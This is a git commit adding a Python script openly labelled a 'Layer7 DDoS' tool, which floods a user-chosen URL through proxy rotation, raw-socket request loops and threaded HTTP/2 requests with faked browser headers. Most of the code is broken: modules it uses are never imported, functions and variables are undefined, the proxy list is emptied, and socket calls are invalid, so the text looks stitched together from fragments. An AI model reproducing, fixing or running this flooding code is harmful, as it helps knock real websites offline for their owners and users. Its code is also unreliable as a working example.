83cc9dbd86dff2fbba9956bb80102c34ff63db9a
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-07-25 23:39:56 +0300

    Add files via upload

---
+++ dedos.py
@@ -0,0 +1,129 @@
+# Imports
+import socket
+
+# Colors
+yellow='\033[92m'
+cyan='\033[92m'
+pink='\033[92m'
+green = '\033[92m'
+red ='\033[92m'
+white ='\033[92m'
+# Requests
+print("DDoS Layer7:")
+print(red + f"DDoS by DeaDNet")
+upl = input(cyan + "[DATA]  UPL: ")
+THEARD = int(input(yellow + "[DATA]  Theards: "))
+
+method = input(white + "[DATA]  method: ")
+
+
+#proxy
+proxies = {
+    'http': '8.8.8.8:9000',
+    'http': '7.6.5.4:9000'
+}
+proxies = []
+for proxy in proxies:
+    response = requests.get(proxies=proxy)
+    if response.status_code == requests.codes['ok']:
+        break
+#methods
+def AttackPXHTTP2(url, until_datetime):
+    headers = {
+            'User-Agent': random.choice(ua),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'TE': 'trailers',
+            }
+    
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            client = httpx.Client(
+                http2=True,
+                proxies={
+                    'http://': 'http://'+random.choice(proxies),
+                    'https://': 'http://'+random.choice(proxies),
+                }
+             )
+            client.get(url, headers=headers)
+            client.get(url, headers=headers)
+        except:
+            pass
+
+def test1(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    target = get_target(url)
+    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
+    req += 'Host: ' + target['host'] + '\r\n'
+    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
+    req += 'Accept-Encoding: gzip, deflate, br\r\n'
+    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
+    req += 'Cache-Control: max-age=0\r\n'
+    #req += 'Cookie: ' + cookie + '\r\n'
+    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
+    req += 'sec-ch-ua-mobile: ?0\r\n'
+    req += 'sec-ch-ua-platform: "Windows"\r\n'
+    req += 'sec-fetch-dest: empty\r\n'
+    req += 'sec-fetch-mode: cors\r\n'
+    req += 'sec-fetch-site: same-origin\r\n'
+    req += 'Connection: Keep-Alive\r\n'
+    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=test2,args=(until, target, req,))
+            thd.start()
+        except:  
+            pass
+
+def test2(until_datetime, target, req):
+    if target['scheme'] == 'https':
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
+    else:
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            for _ in range(10):
+                packet.send(str.encode(req))
+        except:
+            packet.close()
+            pass
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(url=url, headers=headers, allow_redirects=False)           
+            
+        except:
+            pass
+"response.text"
+# Stats
+sent = 0
+error = 0
+
+# DDoS
+print(  "Zapusk")
+while True:
+    try:
+        s = socket.socket(999999999)
+        s.connect((upl, int(theard)))
+        sent +=0
+        print(green + f"[LOG] GO {sent} ")
+        print("DDoS")
+    except OSError: 
+        error +=1
+        print(pink + f"[LOG] PACKETS {error}")
+        "print(cyan + f( DDoS)"
+    
